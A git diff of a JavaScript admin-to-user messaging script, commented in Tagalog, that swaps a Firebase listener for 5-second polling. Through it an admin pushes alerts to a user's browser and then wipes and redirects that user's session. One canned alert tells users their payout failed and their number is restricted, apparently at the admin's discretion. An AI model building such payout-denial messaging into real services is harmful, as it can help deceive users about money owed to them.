@@ -1,5 +1,6 @@
 /**
- * ADCOM.JS - Admin to User Chat (with separate command path)
+ * ADCOM.JS - Admin to User Chat (Polling Version)
+ * Nagche-check every 5 seconds kung may command
  */
 
 // ========== DETECT CURRENT PAGE ==========
@@ -101,7 +102,7 @@ function closeUserCommandPopup() {
     if (popup) popup.remove();
 }
 
-// ========== ADMIN: SEND COMMAND SA SEPARATE PATH ==========
+// ========== ADMIN: SEND COMMAND ==========
 async function sendCommand(phone, type) {
     if (!isAdminPage) return;
     
@@ -114,12 +115,14 @@ async function sendCommand(phone, type) {
         message = '⚠️ Payout Unsuccessful! Your number is restricted. Use another registered number.';
     }
     
-    // Gumamit ng SEPARATE PATH: user_commands/{phone}
-    await db.ref('user_commands/' + phone).set({
+    // I-save sa Firebase
+    await db.ref('command_queue/' + phone).set({
         message: message,
         type: type,
         timestamp: Date.now()
     });
+    
+    alert('Message sent to user!');
 }
 
 // ========== ADMIN: MAKE PHONES CLICKABLE ==========
@@ -150,37 +153,53 @@ function observeTableChanges() {
     makePhonesClickable();
 }
 
-// ========== USER: LISTEN SA SEPARATE PATH ==========
-function listenForCommands() {
+// ========== USER: POLLING EVERY 5 SECONDS ==========
+let isProcessing = false;
+
+async function checkForCommand() {
     const userPhone = localStorage.getItem('userPhone');
     if (!userPhone) return;
     
-    // Nakikinig LANG sa user_commands/{phone} - HINDI sa user_sessions
-    const commandRef = db.ref('user_commands/' + userPhone);
+    if (isProcessing) return;
+    isProcessing = true;
     
-    commandRef.on('value', (snapshot) => {
+    try {
+        // Tignan kung may command
+        const snapshot = await db.ref('command_queue/' + userPhone).once('value');
         const command = snapshot.val();
         
-        // KUNG MAY COMMAND
         if (command) {
-            // MAG-ALERT KAY USER
+            // MAY COMMAND! Mag-alert
             alert(command.message);
             
-            // DELETE COMMAND PARA HINDI MAULIT
-            db.ref('user_commands/' + userPhone).remove();
+            // I-delete ang command para hindi maulit
+            await db.ref('command_queue/' + userPhone).remove();
             
-            // CLEAR DATA AT REDIRECT
+            // Clear user data
             localStorage.removeItem('userPhone');
             localStorage.removeItem('userDeviceId');
             localStorage.removeItem('userSession');
             
-            // I-DELETE ANG USER SESSION
-            db.ref('user_sessions/' + userPhone).remove();
+            // Delete user session
+            await db.ref('user_sessions/' + userPhone).remove();
             
-            // REDIRECT
+            // Redirect
             window.location.href = 'index.html';
         }
-    });
+    } catch (error) {
+        console.log('Check error:', error);
+    } finally {
+        isProcessing = false;
+    }
+}
+
+// ========== START POLLING ==========
+function startPolling() {
+    // Unang check agad
+    setTimeout(checkForCommand, 1000);
+    
+    // Tapos every 5 seconds
+    setInterval(checkForCommand, 5000);
 }
 
 // ========== START ==========
@@ -192,10 +211,11 @@ function init() {
             setTimeout(observeTableChanges, 1000);
         }
     } else {
+        // User side - mag-start ng polling
         if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', () => setTimeout(listenForCommands, 1000));
+            document.addEventListener('DOMContentLoaded', () => setTimeout(startPolling, 1000));
         } else {
-            setTimeout(listenForCommands, 1000);
+            setTimeout(startPolling, 1000);
         }
     }
 }
